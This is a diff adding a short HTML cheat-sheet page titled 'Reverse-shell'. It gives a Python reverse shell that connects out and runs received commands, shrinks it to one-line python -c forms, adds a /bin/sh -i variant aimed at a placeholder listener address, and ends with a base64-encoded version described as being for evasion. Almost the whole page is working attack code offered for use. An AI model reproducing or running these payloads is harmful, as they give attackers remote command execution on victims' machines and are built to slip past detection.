@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reverse-shell</title>
+</head><body>Typical basic python reverse shell: <br/>
+<br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">import socket</span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">import subprocess </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">s=socket.socket() </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">s.connect(("127.0.0.1",9000)) </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">while 1:</span></span><br/>
+&nbsp;<span style="font-family: Courier New"><span style="font-size: 8pt">p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span></span><br/>
+&nbsp;<span style="font-family: Courier New"><span style="font-size: 8pt">s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
+<br/>
+<br/>
+Python relies on spacing to indicate the start and end of a code block. Chop it down to two lines:<br/>
+<br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">&gt;&gt;&gt; import socket;import subprocess ;s=socket.socket() ;s.connect(("127.0.0.1",9000)) </span></span><br/>
+<span style="font-family: Courier New"><span style="font-size: 8pt">&gt;&gt;&gt; while 1: p = subprocess.Popen(s.recv(1024), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE); s.send(p.stdout.read() + p.stderr.read())</span></span>&nbsp; <br/>
+<br/>
+<br/>
+Down to one line: <br/>
+python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect((‘127.0.0.1’,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"<br/>
+<br/>
+<br/>
+<span style="font-size: 6pt">Potential alternative:<br/>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;LIP&gt;",&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br/>
+<br/>
+<br/>
+</span>Encode the payload for potential evasion<br/>
+<br/>
+python -c "exec(‘aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzEyNy4wLjAuMScsOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbihzLnJl\nY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJw\ncm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Muc3Rkb3V0LnJl\nYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n’.decode(‘base64’))"<br/>
+</body></html>
